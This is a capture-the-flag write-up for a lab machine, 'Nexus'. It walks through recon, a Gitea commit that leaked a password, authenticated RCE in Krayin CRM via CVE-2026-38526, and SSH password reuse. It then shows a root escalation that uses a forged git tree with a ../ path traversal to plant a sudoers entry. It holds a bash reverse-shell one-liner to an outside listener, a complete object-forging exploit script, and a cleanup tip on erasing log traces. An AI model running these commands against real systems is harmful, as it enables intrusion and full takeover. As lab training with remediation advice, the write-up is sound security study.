

<img src="Images/Nexus%20-%20logo.png" width="290" alt="Nexus logo">

# Attack Chain

```
nmap (22, 80) → redirect to nexus.htb
  └─► VHOST fuzzing → git.nexus.htb [Gitea] + billing.nexus.htb [Krayin CRM]
    └─► public repo krayin-docker-setup → DB_PASSWORD leaked in first commit
        └─► Krayin CRM login (j.matthew + leaked password)
            └─► CVE-2026-38526 → PHP upload via TinyMCE → RCE as www-data
                └─► .env leaks 2nd password → SSH reuse → jones (user flag)
                    └─► root timer runs template-sync.py every 60s → path traversal in os.path.join
                        └─► forge git tree with ../etc/sudoers.d/pwn (template repo) → write as root → root
```

---
# Table of content

- [Recon](#recon)
	- [Nmap](#nmap)
	- [Web](#web)
	- [Vhost enumeration](#vhost-enumeration)
- [Gitea](#gitea)
	- [Public repository](#public-repository)
	- [Password discovery](#password-discovery)
- [Krayin CRM](#krayin-crm)
- [CVE-2026-38526](#cve-2026-38526)
	- [Proof of concept](#proof-of-concept)
	- [Shell as www-data](#shell-as-www-data)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
	- [Enumeration](#enumeration)
	- [Gitea sync timer](#gitea-sync-timer)
	- [Script vulnerability](#script-vulnerability)
	- [Exploitation](#exploitation)
- [Remediation](#remediation)
- [Cleanup](#cleanup)

---
# Recon

## Nmap

We first ran a port scan to see which ports were open.

```
nmap -sVC 10.129.*.* -oA scans/nexus

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only 2 ports were open, SSH and HTTP. There was also a redirection to `http://nexus.htb`, so we added an entry to `/etc/hosts` to resolve the website.

```
echo '10.129.*.* nexus.htb' | tee -a /etc/hosts
```

## Web

The main website was hosting a presentation of the Nexus company.

![Nexus - main website](Images/Nexus%20-%20main%20website.png)

A job offer was listed, revealing a potential user on the target, `j.matthew@nexus.htb`.

![Nexus - job offer](Images/Nexus%20-%20job%20offer.png)

We also fuzzed for directories, but it returned no results.

## Vhost enumeration

We found two vhosts using `ffuf`.

```
ffuf -fs 154 -c -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.nexus.htb' -u "http://nexus.htb/"

<SNIP>

git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 38ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 112ms]
```

We then added them to `/etc/hosts`.

```
echo '10.129.*.* git.nexus.htb billing.nexus.htb' | tee -a /etc/hosts
```

# Gitea

We first enumerated the `git` vhost, which hosted Gitea.
![Nexus - Gitea](Images/Nexus%20-%20Gitea.png)

## Public repository

While exploring the public repositories, we found **krayin-docker-setup**.

![Nexus - Gitea public repo](Images/Nexus%20-%20Gitea%20public%20repo.png)

It contained the following files:
![Nexus - Files in gitea public repo](Images/Nexus%20-%20Files%20in%20gitea%20public%20repo.png)

## Password discovery

In `.env` the variable **DB_PASSWORD** was empty:

![Nexus - Gitea missing password](Images/Nexus%20-%20Gitea%20missing%20password.png)

However, the password appeared in cleartext in the first commit of the repository.

![Nexus - Gitea public repo's commit](Images/Nexus%20-%20Gitea%20public%20repo%27s%20commit.png)

`krayin` : `N27<REDACTED>`

# Krayin CRM

Looking at the second vhost, we identified **Krayin CRM**, which prompted a login form.

![Nexus - Krayin](Images/Nexus%20-%20Krayin.png)

Entering the password found in Gitea, together with the email from the job offer, authenticated us on the application.
`j.matthew` : `N27<REDACTED>`

![Nexus - Krayin authenticated](Images/Nexus%20-%20Krayin%20authenticated.png)

Clicking the user menu at the top left revealed the version of **Krayin CRM**.
![Nexus - Krayin version](Images/Nexus%20-%20Krayin%20version.png)

# CVE-2026-38526

The version of **Krayin CRM** was vulnerable to **CVE-2026-38526**, an Authenticated Remote Code Execution, because of an Unrestricted PHP File Upload via TinyMCE.
## Proof of concept

A POC for this CVE was available [here](https://github.com/NathanHimself/CVE-2026-38526-PoC), and was used against the target.

```
python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27<REDACTED>' -c id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The exploit worked, and our commands ran as `www-data`.
## Shell as www-data

We then sent a reverse shell to our listener to gain a foothold on the target.

```
python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27<REDACTED>' -c 'bash -c "bash -i >& /dev/tcp/10.10.*.*/6767 0>&1"'
```

```
penelope -i tun0 -p 6767
[+] Got reverse shell from nexus 10.129.*.* Linux-x86_64 👤 www-data(33) • Assigned SessionID <1>

www-data@nexus:~/krayin/storage/app/public/tinymce$
```

# Lateral Movement

With a foothold on the target as `www-data`, we could enumerate **Krayin CRM**'s files deeper.
Looking at the `.env` at the root of the application, we found a different password in the `DB_PASSWORD` variable.

```
www-data@nexus:~/krayin$ cat .env

<SNIP>

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27<REDACTED>
DB_PREFIX=

<SNIP>
```

We also identified the user `jones` on the target.

```
www-data@nexus:~/krayin$ ls /home
git  jones
```

Reusing the password over SSH granted us a shell as `jones`.

```
ssh jones@nexus.htb
jones@nexus.htb's password:

jones@nexus:~$
```

The user flag was retrieved from here.

# Privilege Escalation

## Enumeration

We enumerated sudo privileges for `jones`, but the user had none.

```
jones@nexus:~$ sudo -l
[sudo] password for jones:
Sorry, user jones may not run sudo on nexus.
```

To continue our enumeration, we uploaded **Linpeas** over SSH.

```
scp linpeas.sh jones@nexus.htb:/tmp
```

```
jones@nexus:/tmp$ chmod +x linpeas.sh
jones@nexus:/tmp$ ./linpeas.sh

<SNIP>

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
══╣ Active timers:
NEXT                           LEFT LAST                              PASSED UNIT                           ACTIVATES
Thu 2026-10-01 14:42:23 UTC     16s Thu 2026-10-01 14:41:23 UTC      43s ago gitea-template-sync.timer      gitea-template-sync.service

<SNIP>
```

**Linpeas** revealed a timer related to Gitea.

## Gitea sync timer

We enumerated the timer further and found it ran as `root`, executing `/etc/gitea/template-sync.py` every 60 seconds.

```
jones@nexus:/tmp$ systemctl cat gitea-template-sync.timer
# /etc/systemd/system/gitea-template-sync.timer
[Unit]
Description=Run Gitea template sync every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service

[Install]
WantedBy=timers.target

jones@nexus:/tmp$ systemctl cat gitea-template-sync.service
# /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

But, `jones` had no write access to the directory or the script itself.

```
jones@nexus:/tmp$ ls -ld /etc/gitea
drwxr-xr-x 2 root git 4096 May 12 18:37 /etc/gitea
jones@nexus:/tmp$ ls -la /etc/gitea/template-sync.py
-rw-r--r-- 1 git git 4184 May 11 18:47 /etc/gitea/template-sync.py
```

However, the script was readable.

## Script vulnerability

After analysis, we found the script synchronized the Gitea repositories marked as templates.

```
jones@nexus:/tmp$ cat /etc/gitea/template-sync.py

result = subprocess.run(
    GIT + ['ls-tree', '-r', 'HEAD'],
    cwd=bare_path, capture_output=True, text=True, timeout=10
)
...
meta, filepath = parts          # filepath = extracted from the repo

<SNIP>

target = os.path.join(stage_path, filepath)   # filepath was controlled by the attacker
...
with open(target, 'wb') as f:                 # Written by root
    f.write(cat_result.stdout)
    
<SNIP>
```

The script listed the files of each template repo (`git ls-tree`) and copied them out with `os.path.join(staging, filename)`. The `filename` comes from the repo, i.e. it is attacker-controlled. Since `os.path.join` does not sanitize `..`, a file named `../../../../etc/sudoers.d/pwn` makes the write land in `/etc/sudoers.d/`. Root writes = write-as-root anywhere.

The script also fetched other users' repositories, so `jones` could create a public repository and `root` would fetch it on its own.

But Git refuses a file named `..`, so we had to forge the tree object by hand to slip the `../` inside it.

## Exploitation

First, we created a directory in `/tmp` to host the repository.

```
jones@nexus:/tmp$ mkdir /tmp/exploit && cd /tmp/exploit
```

We then initialised a repository and ran the following script.

```python
#!/usr/bin/env python3
# Forge a git commit whose tree contains a path-traversal filename ('..'), which git's own commands refuse to create , by writing the objects straight into .git/objects.
import hashlib, zlib, os, time

PAYLOAD   = b'jones ALL=(ALL) NOPASSWD:ALL\n'
TRAVERSAL = '../../../../../../../../etc/sudoers.d/pwn'
OBJDIR    = '.git/objects'

def write_obj(otype, content):
    data = ('%s %d\0' % (otype, len(content))).encode() + content
    sha  = hashlib.sha1(data).hexdigest()
    d = os.path.join(OBJDIR, sha[:2]); os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, 'wb').write(zlib.compress(data))
    return sha

# blob = contents of the future /etc/sudoers.d/pwn
blob = write_obj('blob', PAYLOAD)

# nested trees, from the innermost level up to the root.
# mode 100644 for the file, 40000 (no leading zero!) for a subdirectory.
sha, mode = blob, '100644'
for name in reversed(TRAVERSAL.split('/')):
    entry = mode.encode() + b' ' + name.encode() + b'\0' + bytes.fromhex(sha)
    sha = write_obj('tree', entry)
    mode = '40000'
root = sha

ts = int(time.time())
commit = ('tree %s\nauthor a <a@a> %d +0000\ncommitter a <a@a> %d +0000\n\ninit\n'
          % (root, ts, ts)).encode()
commit_sha = write_obj('commit', commit)

os.makedirs('.git/refs/heads', exist_ok=True)
open('.git/refs/heads/main', 'w').write(commit_sha + '\n')
print('[+] commit', commit_sha)
```

This script manually built the git blob/tree/commit objects and wrote them directly into `.git/objects`, bypassing git's `hasDotdot` fsck check so the `..` traversal survives into the pushed tree.

```
jones@nexus:/tmp/exploit$ git init -q

jones@nexus:/tmp/exploit$ python3 /tmp/exploit.py
[+] commit 54e0aad3f3df55a5e7cb89f5725410d81f4c41df
```

We then verified the malicious object had been created correctly.

```
jones@nexus:/tmp/exploit$ git ls-tree -r main
100644 blob 0054727ea17686e0efe0b8846a6129a64a43f556    ../../../../../../../../etc/sudoers.d/pwn
```

It worked as intended.

Finally, we created the repository.
The user `jones` also existed on **Gitea** and reused the same password as on the target, so we authenticated as that user.

```
jones@nexus:/tmp/exploit$ curl -s -u 'jones:y27<REDACTED>' -X POST -H 'Content-Type: application/json' -d '{"name":"pwn","auto_init":false}' http://localhost:3000/api/v1/user/repos
```

We then pushed the repository to **Gitea**.

```
jones@nexus:/tmp/exploit$ git -c transfer.fsckObjects=false push -f 'http://jones:y27<REDACTED>@localhost:3000/jones/pwn.git' main
```

Since the script only processed repositories marked as templates, we flagged our malicious repository as a template.

```
jones@nexus:/tmp/exploit$ curl -s -u 'jones:y27<REDACTED>' -X PATCH -H 'Content-Type: application/json' -d '{"template":true}' http://localhost:3000/api/v1/repos/jones/pwn
```

After 60 seconds, `jones`'s sudoers entry had been written successfully, and we could switch to `root`.

```
jones@nexus:/tmp/exploit$ sudo -l
Matching Defaults entries for jones on nexus:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jones may run the following commands on nexus:
    (ALL) NOPASSWD: ALL
```

```
jones@nexus:/tmp/exploit$ sudo -i
root@nexus:~#
```

> [!TIP]
> **Machine Rooted**

# Remediation

| # | Finding | Risk | Remediation |
|---|---------|------|-------------|
| 1 | Secret committed to a public Gitea repo (`DB_PASSWORD` in first commit) | Credential leak enabling initial access | Rotate the exposed secret; purge it from git history (`git filter-repo`); keep secrets out of VCS and scan commits (e.g. gitleaks) pre-commit |
| 2 | Password reuse across Krayin, SSH (`jones`) and Gitea | One leaked secret compromises several accounts | Enforce unique per-service credentials and a password policy; prefer SSH keys over passwords |
| 3 | Krayin CRM vulnerable to CVE-2026-38526 (unrestricted file upload) | Authenticated RCE as `www-data` | Patch Krayin to a fixed release; restrict upload types/extensions server-side; serve uploads from a non-executable location |
| 4 | Sync script runs as `root` | Any flaw in the script yields full root | Run the service under a dedicated low-privilege account (e.g. `git`) with only the access it needs |
| 5 | Path traversal: unsanitised `filepath` in `os.path.join` | Arbitrary file write as root | Validate every entry: reject names containing `..`; resolve with `os.path.realpath` and confirm the result stays under `stage_path` before writing |
| 6 | Any user's public template repo is ingested | Untrusted input reaches a root process | Restrict the sync to a trusted owner/org; do not process arbitrary public repositories |
| 7 | `template-sync.py` world-readable | Discloses the exploitable logic to any local user | Restrict read access to the service account (`chmod 640`, `root:git`) |

# Cleanup

| Artifact | Location | Action |
|----------|----------|--------|
| Malicious sudoers entry | `/etc/sudoers.d/pwn` | `rm /etc/sudoers.d/pwn` (as root) |
| Malicious Gitea repository | `jones/pwn` on Gitea | Delete the repo via the UI or `DELETE /api/v1/repos/jones/pwn` |
| Staged template files | `/home/git/template-staging/jones/pwn` | Remove the staged copy |
| Local exploit workspace | `/tmp/exploit` (+ `/tmp/forge.py`) | `rm -rf /tmp/exploit /tmp/forge.py` |
| Uploaded enumeration tool | `/tmp/linpeas.sh` | `rm /tmp/linpeas.sh` |
| Reverse shell payload | Krayin TinyMCE upload dir (`~/krayin/storage/app/public/tinymce`) | Delete the uploaded PHP file |
| Sync log traces | `/var/log/template-sync.log` | Remove the `jones/pwn` sync lines if clearing traces |

---

<div align="center">
  <a href="https://labs.hackthebox.com/achievement/machine/2127339/948">
    <img src="Images/Nexus%20-%20pwned.png" width="600" alt="Nexus has been Pwned">
  </a>
</div>
